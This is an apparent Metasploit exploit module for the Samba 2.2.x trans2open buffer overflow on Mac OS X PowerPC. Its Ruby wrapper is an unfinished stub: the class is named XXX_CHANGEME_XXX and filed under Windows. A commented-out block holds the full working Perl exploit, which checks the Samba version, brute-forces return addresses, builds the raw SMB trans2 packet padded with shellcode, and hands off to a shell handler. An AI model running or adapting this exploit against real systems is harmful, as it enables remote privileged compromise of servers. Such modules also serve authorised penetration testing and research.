require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Samba trans2open Overflow (Mac OS X)',
			'Description'    => %q{
				This exploits the buffer overflow found in Samba versions
				2.2.0 to 2.2.8. This particular module is capable of
				exploiting the bug on Mac OS X PowerPC systems.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4469'],
					[ 'URL', 'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'],
					[ 'MIL', '54'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'MinNops'  => 512,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'osx',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Apr 7 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::samba_trans2open_osx;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::SMB;
use IO::Socket;

my $advanced = { };

my $info =
  {
	'Name'    => 'Samba trans2open Overflow (Mac OS X)',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'ppc' ],
	'OS'    => [ 'osx' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The samba port', 139],
		'SRET', => [0, 'DATA', 'Use specified return address'],
		'DEBUG' => [0, 'BOOL', 'Enable debugging mode'],
	  },

	'Payload' =>
	  {
		'Space'     => 1024,
		'BadChars'  => "\x00",
		'MinNops'   => 512,
		'Keys'      => ['+findsock'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits the buffer overflow found in Samba versions
        2.2.0 to 2.2.8. This particular module is capable of
        exploiting the bug on Mac OS X PowerPC systems.
}),

	'Refs'  =>
	  [
		['OSVDB', '4469'],
		['URL',   'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'],
		['MIL',   '54'],
	  ],

	'Targets' =>
	  [
		["Mac OS X",    0xbffffdfc, 0xbfa00000, 512],
	  ],

	'Keys'  => ['samba'],

	'DisclosureDate' => 'Apr 7 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );
	if ($s->IsError) {
		$self->PrintLine("[*] Error creating socket: " . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $x = Pex::SMB->new({ 'Socket' => $s });

	$x->SMBNegotiate();
	if ($x->Error) {
		$self->PrintLine("[*] Error negotiating protocol");
		return $self->CheckCode('Generic');
	}

	$x->SMBSessionSetup();
	if ($x->Error) {
		$self->PrintLine("[*] Error setting up session");
		return $self->CheckCode('Generic');
	}

	my $version = $x->PeerNativeLM();
	$s->Close;

	if (! $version) {
		$self->PrintLine("[*] Could not determine the remote Samba version");
		return $self->CheckCode('Generic');
	}

	$self->PrintDebugLine(1, 'LanMan: '.$version);
	$self->PrintDebugLine(1, ' OpSys: '.$x->PeerNativeOS);

	if ($version =~ /samba\s+([01]|2\.0|2\.2\.[0-7]|2\.2\.8$)/i) {
		$self->PrintLine("[*] Target seems to running vulnerable version: $version");
		return $self->CheckCode('Appears');
	}

	$self->PrintLine("[*] Target does not seem to be vulnerable: $version");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target       = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Starting bruteforce mode for target ".$target->[0]);

	if ($self->GetVar('SRET'))
	{
		my $ret = eval($self->GetVar('SRET')) + 0;
		$target->[1] = $target->[2] = $ret;
	}

	my $curr_ret;
	for (
		$curr_ret  = $target->[1];
		$curr_ret >= $target->[2];
		$curr_ret -= $target->[3]
	  )
	{

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		my $x = Pex::SMB->new({ 'Socket' => $s });

		$x->SMBNegotiate();
		if ($x->Error) {
			$self->PrintLine("[*] Error negotiating protocol");
			return;
		}

		$x->SMBSessionSetup();
		if ($x->Error) {
			$self->PrintLine("[*] Error setting up session");
			return;
		}

		$x->SMBTConnect("\\\\127.0.0.1\\IPC\$");
		if ($x->Error) {
			$self->PrintLine("[*] Error connecting to IPC");
			return;
		}

		# This value *must* be 1988 to allow findrecv shellcode to work
		my $pattern = Pex::Text::EnglishText(1988);
		substr($pattern, 3, length($shellcode), $shellcode);

		# Compilers differ slightly... cover the entire area :-)
		substr($pattern, 1195, 64, pack('N', $curr_ret) x 16);

		my $Trans =
		  "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
		  "\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
		  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90";

		my $Overflow = $Trans . $pattern;
		$self->PrintLine(sprintf("[*] Trying return address 0x%.8x...", $curr_ret, length($Overflow)));

		if ($self->GetVar('DEBUG'))
		{
			print STDERR "[*] Press enter to send overflow string...\n";
			<STDIN>;
		}

		$s->Send($Overflow);

		# handle client side of shellcode
		$self->Handler($s->Socket);

		$s->Close();
		undef($s);
	}
}

1;

=end


end
end	
